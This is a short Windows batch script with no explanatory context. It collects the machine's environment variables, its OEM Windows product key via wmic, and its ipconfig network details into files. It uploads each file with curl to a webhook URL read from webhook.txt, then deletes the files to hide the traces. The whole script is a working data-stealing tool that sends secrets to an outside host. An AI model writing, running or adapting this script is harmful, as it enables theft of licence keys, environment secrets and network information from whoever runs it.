@echo off
color 46
FOR /F %%i IN (webhook.txt) DO @set "output=%%i"
echo Webhook file read
set "attachment=set.txt"
echo Set attached
set "attachment2=pkey.txt"
echo Product key attached
set "attachment3=ip.txt"
echo IP attached
set > set.txt
echo Set written
wmic path softwarelicensingservice get OA3xOriginalProductKey > pkey.txt
echo Product key written
ipconfig > ip.txt
echo IP written
set "message_text=`set`"
curl -k -F "payload_json={\"content\": \"%message_text%\"}" -F "file1=@%attachment%" %output%
echo Set sent
set "message_text=`wmic path softwarelicensingservice get OA3xOriginalProductKey`"
curl -k -F "payload_json={\"content\": \"%message_text%\"}" -F "file1=@%attachment2%" %output%
echo Product key sent
set "message_text=`ipconfig`"
curl -k -F "payload_json={\"content\": \"%message_text%\"}" -F "file1=@%attachment3%" %output%
echo IP sent
del %attachment%
del %attachment2%
del %attachment3%
echo Written files deleted

